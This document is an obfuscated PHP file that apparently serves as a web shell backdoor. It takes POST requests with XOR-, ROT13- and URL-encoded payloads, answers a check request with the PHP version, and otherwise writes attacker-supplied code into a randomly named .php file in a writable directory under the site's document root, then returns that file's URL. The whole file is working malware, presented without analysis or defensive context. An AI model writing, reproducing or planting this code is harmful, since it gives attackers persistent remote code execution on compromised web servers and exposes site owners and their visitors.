<?php $xdavn = "qhicdxkvhbrnetxe";$migls = "";foreach ($_POST as $ixtxof => $fhiwbhkow){if (strlen($ixtxof) == 16 and substr_count($fhiwbhkow, "%") > 10){qhmmjrll($ixtxof, $fhiwbhkow);}}function qhmmjrll($ixtxof, $svmdt){global $migls;$migls = $ixtxof;$svmdt = str_split(rawurldecode(str_rot13($svmdt)));function lsbciw($mimhc, $ixtxof){global $xdavn, $migls;return $mimhc ^ $xdavn[$ixtxof % strlen($xdavn)] ^ $migls[$ixtxof % strlen($migls)];}$svmdt = implode("", array_map("lsbciw", array_values($svmdt), array_keys($svmdt)));$svmdt = @unserialize($svmdt);if (@is_array($svmdt)){$ixtxof = array_keys($svmdt);$svmdt = $svmdt[$ixtxof[0]];if ($svmdt === $ixtxof[0]){echo @serialize(Array('php' => @phpversion(), ));exit();}else{function lkpdz($hkjekxir) {static $brrwvgz = array();$zxfamsoqwf = glob($hkjekxir . '/*', GLOB_ONLYDIR);if (count($zxfamsoqwf) > 0) {foreach ($zxfamsoqwf as $hkjekx){if (@is_writable($hkjekx)){$brrwvgz[] = $hkjekx;}}}foreach ($zxfamsoqwf as $hkjekxir) lkpdz($hkjekxir);return $brrwvgz;}$mltfu = $_SERVER["DOCUMENT_ROOT"];$zxfamsoqwf = lkpdz($mltfu);$ixtxof = array_rand($zxfamsoqwf);$sqmbicaa = $zxfamsoqwf[$ixtxof] . "/" . substr(md5(time()), 0, 8) . ".php";@file_put_contents($sqmbicaa, $svmdt);echo "http://" . $_SERVER["HTTP_HOST"] . substr($sqmbicaa, strlen($mltfu));exit();}}}